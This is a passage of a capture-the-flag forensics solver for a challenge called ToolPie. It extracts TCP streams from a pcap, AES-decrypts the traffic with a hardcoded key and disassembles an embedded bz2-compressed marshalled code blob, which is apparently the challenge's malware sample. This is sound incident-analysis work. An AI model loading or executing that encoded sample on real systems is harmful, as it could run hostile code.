@B\x97.\xc2,~\xf8\x8a\x14\x94\xeb\x8emR\xf8\xfb\xa5"Qd\xc0\xe6\x81\xbe\x9fc=s\xd6,V\xca\xb1\x80!U\x8c\x82"\xddme\xbc=\xf9\x1b\xfc\x8d\xe6+\xc3\xc8:y\xe2\xfcZ\x1c\x88\x9f{\xdbZK\xb0#,\xb8\x9f\x10\xe1\x03\xb0H\x7f\x89w\xee\xd7\x9dvx\xafo\x98vge%\xdc"\xd1\x0f\x9dQ?\x83N\xe3\xb4\x14j%|C\x08\xb0\x16K\xc1H\x9d\xf8\xbc\xf4\xae\xa7\x8aA\xd0\xbfCM\x85w\x82)c\xcc\xd4\xcaV\xc52j\x14ObB&\xe7NQ\x9e\'93M\x8f`!\xcc\x80#%\x04\xd2\xeb"T\xbe\x8d0\x04\xa5\xad\xa3\xab\xf6\xd5\x86\xe214\xb1\xa6\x12\xa6*t\x94Q\x0c!\xc1\xe0#\x18\x8a\x81\xe4\x12A\xccK\xc6\xa3\xa9\xd0kh\xbb\x11m\xd7\\\xe6\xe8wr\x990\xc0\x83\x85\rC\x9d\xc8\xc7\xfcv\xf8Y/\x93\xc30NFe\xc2\xf7s\x91\xb7B\xa6\x10bb\x11\x18\xb0\x19\xf4\xa1X\xb9\x92\xb3\xdc+\x962\x9c\x0bt\xd9l,&\xe8\x1f\x0b\xfe\xf4\xb7\xcd\x0e\x11\xc9#Z\xb0\x90d2]\x06\x89\xcd\t\\\xa3\t\xad\x8d\x9b\xe5Z\xd0\xa6\xa73q{>_\xd7\xdd\xe21\x83\xa2k\x04DO\xc0Ag;Z\x99;\xdf\x14\x9e<\xe3v\x1d\x99\x8b\x9a\x98d\xe6\x05\xcd)\x94\xc2\x9b:F \xcdG\xdeP\x869\xdd)kg\xd2\xde*\x1a\x9c\x04\x10\x12z\xda4\x8d,\xcb\xec\xcbR\x99\x0f\x9c\x81\x08\xearz\xe5R\x17\'Y.=\x9el\xe9\xc4\xeew0\x08\x06\xc0g/m\xe0\xf04\x1c\x0c\xfcN\xc0Q\xaa\xbf\xc5\xe8\xa0y5\x88\x83\xdet\xa3\xce!e"\\\x13F\xeeo\xf7]\xcd\xa0t\x01F[h\xad\xa0a\xd7\x02\xda5\xcdo\xa9>\xf0\x88P\x9dM\xb3A\xc8\x92\xd6\x8b\x1b.\x8b\x8f\x9b\x8c\xda\x9cQ\xa1o\x14\xeb\'\xeb\x9f?\xf1\xd5\x87P\x0c\xb6g*\x1bqX\x93P=@\x1c\x0b\xab\xec\t\x1dq\xa9\x94\x16\x10u\x0ez\xc7\x9eG*\x12\x06K\xf5\xb8\x1ca\xe7 \x1a\xf0\xb5\xa8\x879\x86\x18\xe2\xb0\x96\xc1]~`ac[\xc2\xde\x83\xa5G2@[2\x96\xc5f\x7f\x17\xa7\n\x1b\x9cU\x06\x07;`\x96\xa31\t\xe8\x94t\xc0\xbdzW\xaeW\xb3^\xf4\x9e\xf6\x834\x0c\xb2"\x8e\x94\xda\xafp\xa4%N\x93\x045C\xa1`A\x02\xc1-h\x80\x8d\xb6\xc9d\xc5\xde\x98-\xa2\xbf\xafB\x8c\xd2\x9a\xbe\x98,\xc4\xfd\x93(V\xd1j\xd3\x1cA\xb5\xae\x7f\xae\x8e\x9c\xb0)\x8b5\x96\x0c\xffR\x9e\r\t\xae24\xf6\xf6\xfb\x85=\xc7\x8dd\xc8O1\xcb\xce\xb2*\x98\x1d\xb5LW\xaft\xcb\xcb\xbe)\xfc\xc0L\xacJ\x03\x95\x1b\x85\x94\xd0^\xe2uv/\x00\x10\r\'\x1e\xc7\xb5\xfd\xe7\xe6\xaf\x03\xa6\'\x88U\xab\xd9\xa85\x8a\xca\xd4\x84o\xb0\x83\xc4\xb9\x1a\xf4\x8c\xc0\xb9T\xae\x86\xa2cP[\x80D\x1a\x91z\xca\xb0\x83`4\x84\x8aM\';r\x91d%\x99\x89\xa7\x10Xp\xc8\x96\\\x82[\xe8\x9b\x01\xc0\xdd\x07\r\x10\xc7\x85\x83R\x04Tc\x1e\x99<)\xc9\x98`\x16\x9c\x82bl\xac\xa9I\xedh+P\xcc\xa7l\xb17\x97S\x1b\x83W\xbe\xa5|\x083ZJ\x80\xec\xcfm\xc8\xd9\x8b\x1a!\xbf\x0c\x14\x12<{f\xa2\xa0\x05u\xb2\xf9\xf2\x9a\xde\x95r\xa0\xf5>"\'\xe9\xe8\xae\x12\x1a\x12\x92Q\x11\x91\xa8"\xe2\xbf0\xb2\xe5Z\x88D\xe6\x01\x88#\xd3\xaa\xabV}\xbd\xd6Kh\x1aOG\x96*\xa0\xd7\xad\xd8\\h\xc3U\x80\x7f\xa0\xb3\x04\x86\x0f\xa4\xb2\xb5\xfb*VV\xa5\xab\xc5 \xba(U*\x1e8\xa7\xa1R\x17\xb5H\xcbh\xf8\x1d}\xf5I\xa7UY\xca8#\xf6k!&|>\x13(<\xb3\xcf;#\x8b\x11\x8e\x9f\x07I\x03 \x13\xf8\xde:\xceW\xc0,V\xc0X@\xd0\x02\x04bT+\xc3\xd0\x14uu\xeb\xbbE\xa4X\xef\xed\x1c(\x9a\xcc\xf9n+\xf0\xe0f\x9fv/v6\xed\xd2\xc6/\xca^\xd0\x8bt\xe9&\xdc\t\x93\x80\x8a\xa4F\xa6xn`\xb7\x9d\x86\xc7c\xa0Y1\xe6\x89\x92\x08h\x8b\xf8)8?\x13\n\xe6<\xd8\xea5\xec\x80\x01b\xc6\\\xbe\x90\x07\xc8.a\xca\xca\x91\xd8hQ\xb1\xc4\xf9\xf2\x1a\x95\x8c\xe1h0\r+\xb0:\xd4\x02$!PC\x83P\xe4L\x99\xb9\x16q\xd4\xa1\x98\rJ0\x97\xd7\xdb3|\x80\x81\xe8\xe1.\x00@\xa8\xca\xc7\xd5\xfcK\xc9\xaa\xc6\xec\xc7\x97\xbc\x99\xb6m\xf1\x87\x9aM\xbdO\xd3?\xbc\x97\x93\xaflr\x9c=\x8f\xce\xfe\xd4*\x03\x92?*T\x18<\x85\xc2+\x04\xc3@\x04\xf5\xf3\xc0ji#\xe4p\x18\xb5\xcd\x1f`b\x83\x99\xa3\xfc\x00?\x8fK\xbc\xa6g\xd9\x00\xd2v\xdf\x97+\xd3\x961\xa8zm\xe5\x9bP\x04\xf2L&? \xc0`\xb4\x00\xca\xf0a\xbe9C\x80b\x87E\x83\xceh\xf93t}[\x1f\x9a&\xfa\x0c\x1a`\xe5\xcc?e\xdb\x06\xe3<\xf7IGH\x9c]%hp\xec?$\x19\xb9O\xd1)\xb9\xb2\x0c\xb7\x03ZGX\xe3\x92\x08\xd2\xc9VBp,\xb7\xec\x943\x8a\xd2\x1f5A@HQ\x9d \x80\xa3p8\xf1\xa2M\x07|\x95n\xe3\x92k\xf9\xb5\xd0 \xa7\xc0\x85/\xfcC]\x04<\xd5\n5\x87\x11\x17\xe4o@\x9b*\xc0\n\xc3NkOh\xf8n \nj?\x9f=\xf5}\x06\x15h\x977A]\x0b\xb8\x94\xbe\xb0\xd7\xbe\xba\x8e\xb7\xafn\xa6\x9f#\x08?5\xde\xddm?\xec\xc6\xaa3\xd6jV\x0b.\xeam\xab\x94`\x95O\x13\x188\xc6\xc8I$9\x83\x7fil\xf2\xf9\x17\x19h\x93*\xbfk\xb2\xea#\xad\xbf\xcb\xe5{C\x15\xcef^\xca\x88\x99Wya\xac\x8c\xdb\x11\x16\xd9\x07\x05y\xe5C\xb4,\xc2\xc3\xcdP\xd2\xec\xe4\xceT$\xaa*\xa1&[[\x8d\xb7\xc5\x9b\xc3C\xba)_F\xba\xbd\xac<N7)g\x9f\xc1\xd8p\xab\'\xd9#K\x966z\xfc\x9d\xeb\xd7w\xb7\xd0\x89\xa4\xb9 \x88\x88\x846\xb5\xa1\x84J\xce\xa2\x0b\xe877\xf7\xf3\x17\x0c\xd3\xd0)\xe3\x07\xdcvm\xa0#\x96\xffx\xaa\xe6E_\x07aO\xefj\xba\xe3c\x9b\xdel$\x83h\x9e\tL\x1f\xa0}%"p\x9c\xd4\xd1\x9e\x8e\xfdf]\t\xac#\xbf\x15\x9c<\xf3-\xc2Zj\x99\xae\xc8.\xb3\x9d5\xfa\xe2\xae\xea\xba\xf4\xc63\x04Ot\xf9\x12\xd1{nMJB\x1b,\xbc\xbek\xa0\xca\xa6\xa5\x93/\x0f\xa1)Y\xb4v2L3\xa5\x8d\x0cq(\x0f\x18\x10\x82P-"\xe5\xe1\xe8\xb3\xa3SxJ\xcc\x0c\xdc\xae-n\xf7}w\x19\xae.\xcbi\\b\xdf0[\x10\xe9\x1a2xVZK\xd0S\x88\xd2c&+\xf7\x83Oj\x9d\xab\xb7Uh"z\x97\xf0\x9d\xa7\x92\xd6[(w\x0e)\xc8\xffM|\xa3j\xa15\xc7\x04\xe4Z\xd8\xa2\x88\x08\r\xea\x90J\xbaM\x01\xb0\xd2uQ\xc0\xa1\xcd\\\xadV\xe2\xf3.\x0bl\xe8\xa9^$\xc9\x95\xf6T\x13W\x18\x824\x016\xc8%,\x08\xbe\n\xa2\xd5AB\xdd5[=m7:\x06\xa0\x80\x86\x04\xb5\xe5E\x83K>qyY\x94S\xb8\xd80\xd6[\xc2\x84k\x0b\xdb\xec\x15\xb6\xcf-\'\xf0e@f\xa9Q6U\xcbi\x13N\xbas]3Q\xb1\x8diFP\xbb!P\xff\xd2\x82n\x98\x9dH^\xd6k\xd3\x8e%\xe0k\xca\x9b\xd4\xff\x90\xba-Q\x15\xa5\xd3\x14O\xe0\x12\x06]"\xb2\xa8\x82\xac`\'L\x98\xbd\xbcb;\xad\x13T\x95\x15o\x1a!\x89\xc3\xadN|z\x9bv\xf9\x98\x14\xca\xff\xe2\xeeH\xa7\n\x12\x11\xa5N\xe0\x00'

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def demarshalling(self):
        """
        Description:
            This function is used to demarshall the compressed data and display the disassembled code.
            Challenge specific function
        """
        self.load_compressed_data()
        data = bz2.decompress(self.compressed_data)
        code = marshal.loads(data)

        print(dis.dis(code))

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def dec_file_mes(self, mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())

        return unpad(cypher.decrypt(mes), 16)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def unified_extract_packets(self, pcap_file, pcap_function: str, raw: bool = False):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]

        Returns:
            dict: Dictionary of packets
        """

        packets = None
        # Dictionary to hold packets
        packets_dict = {}

        if pcap_function == "scapy":
            packets = rdpcap(pcap_file.as_posix())
        elif pcap_function == "pyshark":
            packets = pyshark.FileCapture(pcap_file.as_posix())

        if raw:
            return packets

        for i, packet in enumerate(packets):
            packets_dict[i + 1] = packet

        return packets_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def smart_extract_packets(
        self,
        pcap_file,
        pcap_function: str,
        raw: bool = False,
        save: bool = False,
        filename_save: str = "packets.pickle",
        folder_save: str = "data",
    ):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a dictionary.
            If the file already exists, it loads the file.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]
            raw (bool, optional): Option to return the raw packets. Defaults to False.
            save (bool, optional): Option to load saved file . Defaults to False.
            filename_save (str, optional): Filename to save the packets if enabled. Defaults to "packets.pickle".
            folder_save (str, optional): Folder to save the filename if save is enabled. Defaults to "data".
        """

        file_path = None

        if save:
            file_path = self.folfil(folder_save, filename_save)

        if file_path is None or file_path.exists() is False:
            # Read the pcap file
            print(f"Extracting packets using {pcap_function}")
            packets = self.unified_extract_packets(pcap_file, pcap_function, raw=raw)

            # Save the packets
            if save:
                self.pickle_save_data(
                    packets, filename=filename_save, folder=folder_save
                )
        else:
            print(f"Loading packets from {filename_save}")
            packets = self.pickle_load_data(file_path)
        return packets

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def custom_stream_extract(self, stream_num=None):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            stream_num (int): Stream number to extract

        Returns:
            dict: Dictionary of packets
        """

        packets_scapy = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="scapy",
            save=True,
            filename_save="packets_scapy.pickle",
        )

        packets_pyshark = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="pyshark",
            save=True,
            filename_save="packets_pyshark.pickle",
        )

        packet_dict = {}
        for i, packet in packets_pyshark.items():
            if hasattr(packet.tcp, "stream") and int(packet.tcp.stream) == stream_num:
                packet_dict[i] = packets_scapy[i]
        return packet_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def get_scapy_tcp_stream(self, nunber: int):
        """
        Unused , but could be useful in the future
        """
        packets = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="scapy",
            raw=True,
            save=True,
            filename_save="packets_scapy_raw.pickle",
        )
        stream = packets.sessions()
        return stream

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def decrypting_stream_4(self):
        """
        Description:
            Challenge specific function
        """

        stream_4 = self.custom_stream_extract(stream_num=4)

        # print(list(stream_4.keys())[0])
        # # print(stream_4[list(stream_4.keys())[0]].show())

        

        start = 94
        end = 997
        encrypted_data = b""

        for i, packet in stream_4.items():
            if (
                i < start
                or i > end
                or hasattr(packet, "load") is False
                or packet[IP].src != "172.31.47.152"
            ):
                continue

            encrypted_data += packet.load

        try:
            decrypted_data = self.dec_file_mes(encrypted_data, self.encryption_key)
            print(f"Packet {i} :")
            with open(self.folfil("data", "decrypted_data"), "wb") as f:
                f.write(decrypted_data)
            print(decrypted_data)
        except Exception as e:
            print(f"packet {i} : {e}")

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def saving_stream_4_encrypted_bytes(self):
        """
        Description:
            Challenge specific function
        """

        stream_4 = self.custom_stream_extract(stream_num=4)

        start = 94
        end = 996

        # print(list(stream_4.keys())[0])
        # # print(stream_4[list(stream_4.keys())[0]].show())

        encrypted_load_file_path = self.folfil("data", "encrypted_load.txt")

        for i, packet in stream_4.items():
            if i < start or i > end:
                continue

            if hasattr(packet, "load") is False:
                continue

            try:
                with open(encrypted_load_file_path, "ab") as f:
                    f.write(packet.load)
                # decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
            except Exception as e:
                print(f"packet {i} : {e}")

        decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
        print(f"decrypted :")
        print(decrypted_data)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def decrypting_packet(self):
        """
        Description:
            Challenge specific function
        """
        # packet_data_path = self.folfil("data", "packet_1.data")

        ending_number = 94
        packet_path = self.folfil("data", "packets")

        for num in range(94, ending_number + 1):

            packet_data_path = self.Path(packet_path, f"packet_{num}.data")

            with open(packet_data_path, "rb") as f:
                packet_data = f.read()

            decrypted_data = self.dec_file_mes(packet_data, self.encryption_key)
            print(f"Packet {num} :")
            print(decrypted_data)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def main(self):
        # self.demarshalling()
        self.decrypting_stream_4()

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.encryption_key = "5UUfizsRsP7oOCAq"

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pickle_save_data(self, data: any, filename: str, folder: str = "data") -> None:
        """
        Description:
            Save data to a pickle file

        Args:
            data (any): data to write to the pickle file. Can be anything
            filename (str): Filename to save
            folder (str, optional): Folder name inside the ctf folder. Defaults to "data".

        Returns:
            None
        """
        with open(self.folfil(folder, filename), "wb") as f:
            pickle.dump(data, f)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pickle_load_data(self, filename: str, folder: str = "data") -> any:
        """
        Description:
            Load data from a pickle file

        Args:
            filename (str): Filename to load the data from
            folder (str, optional): Folder name to find the file to load the data from. Defaults to "data".

        Returns:
            any: Data loaded from pickle
        """
        with open(self.folfil(folder, filename), "rb") as f:
            return pickle.load(f)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def load_compressed_data(self):
        """
        Description:
            Challenge specific function to load the compressed data
        """
        self.compressed_data = b'BZh91AY&SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4"|\xf9`\r\xff\x1a\xb3\x03\xd1\xa0\x1e\xa9\x11\x07\xac\x9e\xef\x1e\xeez\xf5\xdb\xd9J\xde\xce\xa6K(\xe7\xd3\xe9\xcd\xa9\x93\rS@M\x134&\r\x11\x94xF\x11\xa6\x89\xb2\x99\xa6\x94\xf0\x1ai\xa1\xa6\x9a\x03AF\xd1\x1e\x9e\xa1\x9a\xa7\x89\xa6L\x84\xf5\x1ayC\xd44z\x993S h\r\x0f)\xe9\x03@\x03LG\xa9\xa0\x1a\x04DI\xe8\x19$\xf4\xc9\xe92a\xa3D\xc9\x9aL\x11\x81O\'\xa4\x9e\x935=M\xa4\xd0\xd1\xa6&F\x81\x93L\x86\x80\x00\x00\x06\x80\x00\x00\x00\x00\x00\x00\x00\x00\rM\t4\xd1\x80L\t\x91\x18\xa9\xe4\xc6\x94\xd8\xa7\xb5OS\xc9\xa4=#\xf54\xd4\x06j\x07\xa9\xeaz\x9a\x1e\xa1\xa0z\x86\x83M\x03jh\x00\x03A\xa6@\x1a\x00\x00\x03\xd4\x00\x1e\xa7\x944\x005=\x10\x93\x10\x9b@\x994\xc8\x99\xa3J\x1bM\x1ajyOF\xa6\x98\xcab\x0c\xd16\xa0m&\x8fH\xd3@44\x01\xa0\x00\r\x03@\x004\x19\x00\x00\x00\x004\x1a\x01U44\x00\x03@\xd0\x1a\x0044\xd0\x06@\x1a\x00\x004\xd0\x18\x98\x86@42d\x00h\x1ad\x00\x00\x00\x004h\x00\x00\x00`\x91$Bhh4`\x9a\x19\x04\xc3@\xa9\xedS\xf4S\xd2\x1b\xd4\xda&M&\xd2m#\xcai\xfa\x8c\x93e=@\x1e\x91\xa0z\x8cjh\xd1\xa6\x80\x00\xd0\x004\x1e\xa0\x01\xa0\x1a4i\xb54\xd3\x10\x1f\xdf\xcb\x98\x99\r\xa1\r\x8c`\xd86\x0cd\xe9\xc3\x06\x9bm6\xdbm\x1b\xf1"\xf0\xd2\xa7\xd5p,\x171gAcG]V\xcfvr\x9e\r\x9d=\x13?N\xfa\x8bw3l`\x0e\x1c\xda\xdc\xb0VU\xa0\xe7\x8df>$\x10\xb5\xf2+fu\xd6\xd5\xed\x9a\x9c|b\xb1\xc4\xd1P\xd0\x95\xf8\x10\xc0\xb8\xd2\x10\\ 9\x83UF#^H\x12\x12\x91\x98\x9c\x1d\x89BQ\x8eC\x92\x066\x8bDp\x8a\xaa\x03e%\xad\xc4\xe5o\x8f\x01\xa0\x11\x84\xac\xb8H\x01^\xb7\x84y\xed\x0cU\xb37\xd7[w\xddm\xf4\xf9\xdb\xee7\xa6\x98\xe2-A\xea\x1c\xd6\xbe\xbf1\xe2\x03\x89A:2\xb0n\x0b\xc169\x8a\xab\n\\\xa4\xa0\xbb{ \x11\xa7\x1e-\xbc,P`F\xad\x08\xe1\x8dY\x9b\x02,\x8cs#eg%\x97\x071\xda\xe8XA|>\xa1\xae\xaah%\xc4]\x95w*4i[\x85\xee\xee=\xcf\x935q\x02uo"\xaf\x81/\xc0\xca\xbdF;\xf6\xef\xaa\x99A/ \x91\xef\x0b\xe1\xd9\xa4`w\x9e\xc6\x88\xf2\xa9S\xe3\xa6x\xaf|\x0b*IE\x02\x8a(NL\x00]?\x12\x10p=w\xc6\x92G\x8a\xd2\xff\x17}~y3\xe3\xe9f\xf1\xff\xaf\xf2\xa5\xb9\xa5\xcc\xfd;W\xdd\x1e\xcd\x9e\x0bD5\x0b\x0f\xc6wFW\\\xd5\x8d Gh\xc1\n|x2\x99&\x8e\\\xa5Ba\x7f6!\x10\xe4\xd0p\x18\x90\x97k4\x1a\xec@\x1b~~\x8d\xfe\xee\x96\x07\x8f\xd6\xe1SS\xcdOv\x8c\x89\xd2I\x150\xa5\xdd\xaa>E\x07\xdb\xf8l\x97V\xa0\x1c\x8d\xd9\xa50\x17[h\xd1\x02\x08!f\xad\xea\xa0"\x88\xceC\x0c\x0fVG^\xc0\xea_\x10\xbd\xa1m{5IL\xbb\xd2\x9an\x07\xd9a\x98jgIwr&&\x06\x0c\x8aH\xe73\xdd\xb1\x050\x9f\x1f\x1f\xe1J\'\x9d\x8cY\xa8\x11\x0b\x08\x0fd*\xf2\x9d\xc2\x84$\x10\x8a\xd9\xc1\xe05\xecs\xdeC\x9a\xd1\xb7\x85\x0eNiJj2\x9ag\x12\x94M)\xd2\r\xf3\xa8\x84\xc9\xc2\x06\xe1\x14\xda\xd1\x1e\x1bV\x1a\x0b\xe666\xc6~V\x81/r\x98\x95\xf2g\xc7Mm<\xed\xb0\xe9ko\x01\xcb4\x88\x17\x84\x8a"J\x9bJ\x18\x0ch;\x84\tv\xcb\xbaEL\x99\xdf\xaa)q/t:45\xba\xbf\x84V\xf5\xb3\xad\x8c\xee\x11\xe2(\x18>\xea3\xa9\x98\xa8B\xcf\xb5\xdc\xed\xacI<\x90\x06\x1d0)Y@\x86\x07\x7f\xee\xb9\xf5{m\xdf\x83Hf\xb3T\xd2\xdf\x9c\xc6\xab\xac\x13\x99\xcb\xec\xf5K\xf2\x80\xce\x9fC\xf4w\xeb\x1fa\x08\xd8\r\x80<%\x90w\x8b\xe8}\x8d\xda\x96\xcf)\x1a\xbaD.\xa3\xc2\xe5E\xe3\xc9p\xa8&w\x10\x14\xc6$v-I\xd9\xbd\xcf\xbf\xe1\xce\x19\xcdf\x07\x0b\x7f\xd7\xc8:\xa6nw\xfc=M\\n\xc7\x02\x96\n\x85".j\xa8G}\x04\xef\x1e+\xb0)4\x82G_\x05\xfe\xbe\x94\xf3\x03\xd4*\xe2\xf7T\xa8\x97\x97\xc3X\x8a\x9a;\x9a\xbei\xc9\xad\xd1\xd2\xcf\xde4fpz\xce\rY\xa5\xa2s\xad\xf8(S\xf3*\x85\xea$\x14\x18\xb6\x1a\xbb\xc5.O\xc3\xb7\x89\xeb9\x1a4\xd3\xe0\x999r\x99\x9a(\x84\xce\x17\x0bk\xa59\xd2X\x88\x815\xab\x10x\x9f\xb7\xc5\xe7_R\xaa\xaa\xab\xf2\x9e\xe1\xb9\x8aK\x91\xa3\xa1\xa7\xc0\x94\x8f3\xca\x82\x8azY\xc4g\xed\xcf\xa9BO:`\xb5\x1b2\x12\xbb\x89\x17[m\xa2\xe8\xc4\x0ctJ/-\xa5\xbf\xf1\xffq\x7f\xda\x9a\xd9\x00\xb2\x0b\x98L\x7f\x17\xb4\xc9g}\x1e\xfeSh \xc3\x98fIq\x05]\xb1\x8aB\x98\xc7\x94\x03=2&\x06v@s\x0fX\xb3\xadZ\xcf\xac\xf6\xae\xe2\x0b\xaa\xe4\x99\xf3\xf5<\xd7\x81mu\x87\xb5\x97\xd2\xc3\xb4p\xb5\xad\xd9y\x15\xf2\x06,\xa7;\xe2\xe4\xcaH\xbf\xd5\x92@\xae\x0c\x91\xddD\x9by\xd5\xccj\x7f\xa9\x19\xad\xa3\x07\xbdI\x84\xa9|k/\x0f7=ji\x12\xba\xd4\xfaI\x8c\xa9\x94\n\x9b\xa43\x0e\xa6O\xd3\x8d\xf5\x83\x06\xd8\xaehhl\x05*;\xda\xaa\xd9he\xc8\x8f2!\x98\xd6-B\xa9\xcf\x9a\xb9_\xa4\xec\xda\x08<\xe3\r\xeem\x1el\xd8\xfc}3\xc4\xbal\xe5,P\xe4^\xae-\x97\x91j0\xec\xc8bB\x85\xd1.\xf5T\xa4\xf1\x83\x89\xc4-\\\x00\xf0\xbb\x1a\xd2\x89K\xb58\x96\xe2\x88\xdd<q\r\xbb0\xc4Ac\x95.v\x94\x08>\xca\x8b\xf5\xa1\xaf\x1fVH\x16\n\xfe+\x02\x9f\xe9\xa7VP\x1a\x03m\x01\xab\x0b\xf8\xd1&\xacq\xadg\x0f\xfc\x98N\x91XRQ\x88\xcf- 4K\x84q"\xec\xb2\x8c\xe6e\x86 \x9ff\x10\x83p\xc5\xc1C\xf4\x8c5\xda\xe5\x82)\xcf\n\xbfWZ\xc0\xd1\x9b`\xacFt\xba\xed\xaf#\xc8\xf8\x96\xe9=Zd\xa4h\xa3d>\xb2\xec\xac\x98\xe6%\xca\xb2r\xe2\xd7\xb5\x80\x8c\x1cb0\xadC\x8a\xdb\x1e\x1d\x9ek\xf0>\xcf\'7=\x9b\x19\xdee@\n\xaa\xac\xd2N%$\x91]\xa7\x13c\xe7\xce\x95\x96\x81Yh\nS\xd1\xdc\xb5\xe3d{\x13\xc5\xeau22\xcc\xec\xe1\x19\xb6\n\x8e?\n\x01\xdey\x04t\x02"@\x82\x12J\x88\x86\x1b\x83Un\x03Uy\xed\x82\xc3\x19\xdd\x86\r\xda\x1a\xde\x7f\x14\x90\xb3\xaf?\x05\xd3\xf0\x05\xe9\x85\x83\x99m\x8ae\x86\xd59Zl\x83i\x04u<\x92]\xe9\xca\xbc\xf5k\xcd\x8e,\xc1\xfcU\xc7\x84%|>\xfbt\x9c\x04\xf0}\xceQ|Wy\x9eN\xa8\x19#\x12\x94\xf1\xfdX5`\x19\x0e\x87NwC\xa5\x80p\xb1\xd9\xc73F\xe8\xa5\x9c\x00\xe5\xb1)\xd3]\xa6\r\x9d\x1a\xdd\xa4\x91\xb9z}\x1bg\x12\x9e<\nB\x88\x0e\xdf:\x1c\t\xc3\xa3\x85\x1b\x98y\xec\x0c\x9a\x12Pr\xcdC\xea1\x7f\x01\xef\xc3\xb0\xdd16\xe7\x1e\xf7\x1fv4\x17\r\xd3\x86\xceE@\xce\x15T\xce\x00\xf3@\xd9\r\x05\x19@V\x1c"\x86\xa6\x9c&,\x05\xa6%\x02n(^9\x86\xa65#\xc8\xb5]\x88\x8e\xa2,1\xc3u2\xe0\xa8 \x01\xff"|\xffG\x0b6\xbeU\x8a\xf7;YD\xda\xb4u)l\xf6~\'\x0e\x9b\xb3/\x98Q1\x04\x12JI[\x11*\x81\t\x07\xcb\xadw\xc9\xbf\xbf\xbe\xbaa\xc6\xce\x9e)\x98v\x15\x01j\xa15\xbd\xd0\xcb.\xe3\xd7\xa2`\x15\x9e\x854\xd3\x1am\r\x13A\x9a\xa5\x0b\r\x81\r\xb9\xb3%)Bmr\x12L\r>\x87\x07K\xea\xden\x87\x01c6%\xea\xa5\xd8\xb54\xc0\xca\xb8SBd{O\x9c \x88\x86\xee-80\x81Vv\x08[P\xc221\x9e &,t\x11/9\xe0\xd0\x1f\x1d\xcd\x94\xb9\x95\xc7V\xcb\xd6\xf2M\xf7\xf4gT\xa2\x19\x94\xd9\xfb\x7f\x15\x90\xc5\xb2&\x9e}\x0cq\xe8\xdc(\x1a{l\\\x88\xb8\xab=\x8b\xaaCm\xc0\xcb\xb5w=\xf8\xff\xa3\xdfY\x94\xa5\xa5\x9d0\x04U\x8al\xb8iw\xa3\xb0%\xf1 \x03H\x80\xc9$v\xe6\x98|#DYP\xa4\xfe\'\x04\xe0&\x88+\xeb\xce:\xa0cm,\x1aQ\xfdN\x1c\x97\xa3\x98\xb5q\x1c\xefE\xabEC\xaa\x82\x00\x8c\xcb\xee\x8d\xd6l\xe5\\\xca;\xf9d\xd4\xa5\xaen\xfaW=\x88kU9\xfe\x95&c\x13\x0cL7+5\xe2\xde_\x9f\xf6t\x05Hn\xe2\xff\x9dzi\x9a\x03@`u\xea\x98\xb5\x8e\xd9\xa3W\x85\x96O\x85\x9bf\xc1\xb6\xa4x\xa2/=\x0f\xa6T\xde\xac\xc6\x84\\\xa5q \x8eZ\xd5p*-qC%\xec\x85aH\x90>\xc1\x97%B@\x12B"u\xd5R\x0f\x10`&\x9ai\x1cl*F\xefOr\xaee\xaf\xa9\x88q\xa2k93\xe6\xf6\xf5\xa8n\xd0\xf42\xe5<\xf7}\xad\xdc\xd4)L\x11\x97\xd4\x92\x11E\xe1\xa0\xa4\xe4{\x9a\xe6T\xda \xee\x83\xb7\xce\x17\xb0\xb3\x0c\x11\x8f\xc1t\x0c\xb5\x87\x9e\xbb\x0f\x0fql\xe8T\xc5\x02+E\xdd\xbcQ\x92\xb8\xb8\xc8*,(K\tUk\x16\t\x86\xb9@\'\x04\xc1l&\xcf)\x1f\x14V\x0b\x80\xd2\r\xab\xec\x07) 